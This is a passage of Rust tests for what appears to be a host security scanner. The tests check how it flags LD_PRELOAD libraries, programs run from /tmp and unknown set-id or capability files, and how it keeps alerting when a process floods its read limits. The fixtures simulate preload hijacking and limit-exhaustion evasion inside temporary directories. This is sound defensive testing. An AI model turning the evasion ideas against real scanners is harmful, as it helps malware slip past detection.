        Ok(MountKind::Gone)
    };
    let asked = hold_asked(&top, mount, OsStr::new("proc"), &mut gone).unwrap();
    assert!(matches!(asked, Asked::Gone), "{asked:?}");
    assert_eq!(looked_up, 3);
}

/// The variable `in_a_mount_namespace_the_walks_own_table_follows_its_mounts`
/// runs only with, as `the_walks_own_table_is_read_again_after_a_mount_is_made_or_removed`
/// sets it.
const IN_A_MOUNT_NAMESPACE: &str = "OMARCHY_GUARDIAN_TEST_IN_A_MOUNT_NAMESPACE";

#[test]
fn the_walks_own_table_is_read_again_after_a_mount_is_made_or_removed() {
    use std::process::{Command, Stdio};
    let unshare = || {
        let mut unshare = Command::new("unshare");
        unshare.args(["--map-root-user", "--mount"]);
        unshare
    };
    let can = unshare()
        .arg("true")
        .stderr(Stdio::null())
        .status()
        .is_ok_and(|status| status.success());
    if !can {
        errln!("skipped: unshare cannot make a mount namespace here");
        return;
    }
    let output = unshare()
        .arg(std::env::current_exe().unwrap())
        .args([
            "--exact",
            "sweep::live::tests::in_a_mount_namespace_the_walks_own_table_follows_its_mounts",
            "--ignored",
        ])
        .env(IN_A_MOUNT_NAMESPACE, "1")
        .output()
        .unwrap();
    let stdout = String::from_utf8_lossy(&output.stdout);
    assert!(
        output.status.success() && stdout.contains("1 passed"),
        "{stdout}{}",
        String::from_utf8_lossy(&output.stderr)
    );
}

#[test]
#[ignore = "mounts: run in a mount namespace of its own by \
            the_walks_own_table_is_read_again_after_a_mount_is_made_or_removed"]
fn in_a_mount_namespace_the_walks_own_table_follows_its_mounts() {
    use std::process::Command;

    use super::mount_table::MountTable;
    use super::pinned::{Held, MountKind};
    assert!(
        std::env::var_os(IN_A_MOUNT_NAMESPACE).is_some(),
        "mounts on this system: run only in a mount namespace of its own"
    );
    let dir = TempDir::new("live-table-namespace");
    let root = dir.path();
    fs::create_dir(root.join("m")).unwrap();
    let directory = fs::File::open(root).unwrap();
    let mut table = MountTable::default();
    // Read once before the mount is made.
    let mount = super::pinned::mount_of(&directory).unwrap();
    assert_eq!(table.kind(mount).unwrap(), MountKind::Roots);
    // Asked again with nothing mounted since, it is not read again.
    assert_eq!(table.kind(mount).unwrap(), MountKind::Roots);
    assert_eq!(table.reads(), 1);
    let run = |command: &mut Command| assert!(command.status().unwrap().success());
    run(Command::new("mount")
        .args(["-t", "tmpfs", "none"])
        .arg(root.join("m")));
    let Held::Mounted(_held, on) = held(&directory, b"m").unwrap() else {
        panic!("a mount was made on m");
    };
    assert_eq!(table.kind(on).unwrap(), MountKind::Roots);
    assert_eq!(table.reads(), 2);
    // Read again, the table holds every mount, not only the one made since,
    // and the change that caused the read is not flagged again.
    assert_eq!(table.kind(mount).unwrap(), MountKind::Roots);
    assert_eq!(table.reads(), 2);
    // Unmounted lazily, its id is the held file's, and in no table.
    run(Command::new("umount").arg("-l").arg(root.join("m")));
    assert_eq!(table.kind(on).unwrap(), MountKind::Gone);
}

#[test]
fn a_process_cannot_make_the_live_checks_read_without_end() {
    let dir = TempDir::new("live-preload-flood");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };

    // Past the limit the rest are not looked at, and the process has an
    // alert that says so.
    let libraries: Vec<String> = (0..40).map(|n| format!("/tmp/lib{n}.so")).collect();
    for library in &libraries {
        write(root, &library[1..], "library");
    }
    let environment = format!("LD_PRELOAD={};", libraries.join(":"));
    let flood = running("/tmp/x", &[], None, &environment);
    let items = said(&scope, &flood, "tmp/x");
    let preloaded = items
        .iter()
        .filter(|(path, ..)| path.starts_with("tmp/lib"))
        .count();
    assert_eq!(preloaded, 16, "{items:?}");
    let (_, alerts, notes) = items
        .iter()
        .find(|(path, ..)| path == "tmp/x")
        .expect("the process's own item");
    assert!(alerts.contains(&RuleId::PreloadedLibrary), "{alerts:?}");
    assert!(
        notes
            .iter()
            .any(|note| note.contains("preloads 40 libraries: only the first 16")),
        "{notes:?}"
    );

    // Past the files the live checks read, an item is kept with its alert,
    // unread, and the sweep says so once.
    let mut found = super::Found::default();
    for n in 0..300 {
        let path = format!("tmp/f{n}");
        write(root, &path, "x");
        found.add(
            &scope,
            Category::Process,
            &path,
            "a note".into(),
            Some(RuleId::RunningFromTemp),
        );
    }
    let unread: Vec<&str> = found
        .items
        .values()
        .filter(
            |item| matches!(&item.body, Body::Unreadable(reason) if reason.starts_with("not read")),
        )
        .map(|item| item.path.as_str())
        .collect();
    assert_eq!(unread.len(), 300 - 256, "{unread:?}");
    assert!(found.items.values().all(|item| {
        item.alerts
            .iter()
            .any(|(rule, _)| *rule == RuleId::RunningFromTemp)
    }));
    // As not checked, in a user's sweep too: root's checks have a limit
    // of their own.
    let said_once = found
        .unchecked
        .iter()
        .filter(|sentence| sentence.contains("read at most 256 files"))
        .count();
    assert_eq!(said_once, 1, "{:?}", found.unchecked);
    assert!(found.notes.is_empty(), "{:?}", found.notes);

    // Past the limit a name already read is added to, not left unread,
    // and a new name keeps the file it is about.
    found.add(&scope, Category::Process, "tmp/f0", "again".into(), None);
    found.add_as(
        &scope,
        Category::Listener,
        "tmp/f0:tcp-1",
        "tmp/f0",
        "listens".into(),
        None,
    );
    assert!(!matches!(found.items["tmp/f0"].body, Body::Unreadable(_)));
    let listener = &found.items["tmp/f0:tcp-1"];
    assert!(
        matches!(&listener.body, Body::Unreadable(reason) if reason == super::NOT_READ_PAST_LIMIT)
    );
    assert_eq!(listener.file.as_deref(), Some("tmp/f0"));
}

#[test]
fn up_to_sixteen_preloaded_libraries_are_looked_at() {
    let dir = TempDir::new("live-preload-edge");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    // All 16 are looked at; with one more, the process says so.
    for (count, flagged) in [(16, false), (17, true)] {
        let libraries: Vec<String> = (0..count).map(|n| format!("/tmp/edge{n}.so")).collect();
        for library in &libraries {
            write(root, &library[1..], "library");
        }
        let process = running(
            "/tmp/y",
            &[],
            None,
            &format!("LD_PRELOAD={};", libraries.join(":")),
        );
        let items = said(&scope, &process, "tmp/y");
        let looked = items
            .iter()
            .filter(|(path, ..)| path.starts_with("tmp/edge"))
            .count();
        assert_eq!(looked, 16, "{items:?}");
        let (_, _, notes) = items
            .iter()
            .find(|(path, ..)| path == "tmp/y")
            .expect("the process");
        assert_eq!(
            notes.iter().any(|note| note.contains("only the first 16")),
            flagged,
            "{notes:?}"
        );
    }
}

#[test]
fn a_program_seen_many_times_is_read_once_and_privileged_files_count_too() {
    let dir = TempDir::new("live-read-once");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    };
    write(root, "tmp/f1", "x");

    // One program seen doing many things is read once.
    let mut found = super::Found::default();
    for port in 0..300 {
        found.add_as(
            &scope,
            Category::Listener,
            &format!("tmp/f1:tcp-{port}"),
            "tmp/f1",
            "listens".into(),
            None,
        );
    }
    assert_eq!(found.looked_at, 1);
    assert!(
        found
            .items
            .values()
            .all(|item| !matches!(item.body, Body::Unreadable(_))
                && item.file.as_deref() == Some("tmp/f1"))
    );

    // Past the limit, an account's set-id file or file with capabilities
    // is listed unread and flagged; one already read as a program keeps
    // that read and is flagged too, since it is not read again.
    setuid_file(&root.join("home/u/f2"));
    setuid_file(&root.join("home/u/f3"));
    write(root, "home/u/cap", "x");
    // A directory anyone can write: what is in it is an account's.
    fs::set_permissions(root.join("home/u"), fs::Permissions::from_mode(0o1777)).unwrap();
    let mut found = super::Found::default();
    found.add(&scope, Category::Process, "home/u/f2", "runs".into(), None);
    found.looked_at = 256;
    walk_into(&scope, &mut found);
    let unread = |path: &str| {
        found.items.get(path).is_some_and(|item| {
            matches!(&item.body, Body::Unreadable(reason) if reason == super::NOT_READ_PAST_LIMIT)
                && item
                    .alerts
                    .iter()
                    .any(|(rule, _)| *rule == RuleId::UnknownPrivilegedFile)
        })
    };
    // Read again as a set-id file, it is charged again, as is each other
    // file the walk reads.
    let mut charged = super::Found::default();
    charged.add(&scope, Category::Process, "home/u/f2", "runs".into(), None);
    walk_into(&scope, &mut charged);
    assert_eq!(charged.looked_at, 4);
    let program = &found.items["home/u/f2"];
    assert!(!matches!(program.body, Body::Unreadable(_)));
    assert!(
        program
            .alerts
            .iter()
            .any(|(rule, _)| *rule == RuleId::UnknownPrivilegedFile)
    );
    assert!(unread("home/u/f3") && unread("home/u/cap"));
}

/// Gives `cap_net_raw=ep` to each file that is not set-id.
fn net_raw_unless_set_id(file: &fs::File) -> std::io::Result<Option<Capabilities>> {
    let set_id = file.metadata()?.mode() & 0o6000 != 0;
    Ok((!set_id).then(|| given("cap_net_raw=ep")))
}

/// The set-id walk of `scope` into `found`, on one mount where set-id bits
/// take effect.
fn walk_into(scope: &Scope<'_>, found: &mut super::Found) {
    let mut closed = super::Closed {
        mounts: Some(super::mounts(ONE_MOUNT)),
        ..super::Closed::default()
    };
    super::privileged::privileged_walk(
        scope,
        found,
        &mut closed,
        files(1_000),
        net_raw_unless_set_id,
    );
}

#[test]
fn roots_own_set_id_file_is_read_after_an_account_floods_the_limit() {
    let dir = TempDir::new("live-limit-roots-own");
    let root = dir.path();
    let index = PackageIndex::with_foreign(HashSet::new());
    let scope = Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    };
    // An account's processes run more programs than the live checks read.
    let mut found = super::Found::default();
    for n in 0..300 {
        let path = format!("tmp/p{n}");
        write(root, &path, "x");
        found.add(&scope, Category::Process, &path, "runs".into(), None);
    }
    assert_eq!(found.looked_at, 256);
    // Root's own set-id file, in a directory only root writes, and one of
    // an account's, in a directory anyone can write.
    setuid_file(&root.join("usr/local/bin/roots"));
    setuid_file(&root.join("home/u/accounts"));
    fs::set_permissions(root.join("home/u"), fs::Permissions::from_mode(0o1777)).unwrap();
    walk_into(&scope, &mut found);
    let body = |path: &str| &found.items[path].body;
    assert!(
        !matches!(body("usr/local/bin/roots"), Body::Unreadable(_)),
        "{:?}",
        body("usr/local/bin/roots")
    );
    assert!(
        matches!(body("home/u/accounts"), Body::Unreadable(reason) if reason == super::NOT_READ_PAST_LIMIT)
    );
}

#[test]
fn a_set_id_file_root_cannot_open_is_told() {
    let dir = TempDir::new("live-set-id-unopened");
    let root = dir.path();
    write(root, "home/u/ok", "x");
    fs::set_permissions(root.join("home/u/ok"), fs::Permissions::from_mode(0o4755)).unwrap();
    // Setgid with no read bit for its owner: root's open fails, as it does
    // for a file under a lease or on NFS with `root_squash`.
    write(root, "home/u/sg", "x");
    fs::set_permissions(root.join("home/u/sg"), fs::Permissions::from_mode(0o2055)).unwrap();
    if fs::File::open(root.join("home/u/sg")).is_ok() {
        // As root, nothing keeps the file from opening.
        return;
    }
    let index = PackageIndex::with_foreign(HashSet::new());
    let live = check(&Scope {
        root,
        home: None,
        index: &index,
        origin: Origin::Root,
    });
    for path in ["home/u/ok", "home/u/sg"] {
        assert!(
            live.items.iter().any(|item| item.path == path
                && item
                    .alerts
                    .iter()
                    .any(|(rule, _)| *rule == RuleId::UnknownPrivilegedFile)),
            "{path}: {:?}",
            live.items
        );
    }
}

#[test]
fn set_id_files_count_toward_what_the_live_checks_read() {
    let dir = TempDir::new("live-set-id-flood");
    let root = dir.path();
    for n in 0..300 {
        let path = format!("home/u/s{n}");
        write(root, &path, "x");
        fs::set_permissions(root.join(&path), fs::Permissions::from_mode(0o4755)).unwrap();
    }
    let index = PackageIndex::with_foreign(HashSet::new());
    let live = check(&Scope {
        root,
        home: Some("home/u"),
        index: &index,
        origin: Origin::System,
    });
    let set_id: Vec<_> = live
        .items
        .iter()
        .filter(|item| item.category == Category::Setuid)
        .collect();
    assert_eq!(set_id.len(), 300);
    let unread = set_id
        .iter()
        .filter(|item| matches!(&item.body, Body::Unreadable(reason) if reason == super::NOT_READ_PAST_LIMIT))
        .count();
    assert_eq!(unread, 300 - 256);
    assert!(set_id.iter().all(|item| {
        item.alerts
            .iter()
            .any(|(rule, _)| *rule == RuleId::UnknownPrivilegedFile)
    }));
    assert!(
        live.unchecked
            .iter()
            .any(|note| note.contains("read at most 256 files")),
        "{:?}",
        live.unchecked
    );
}
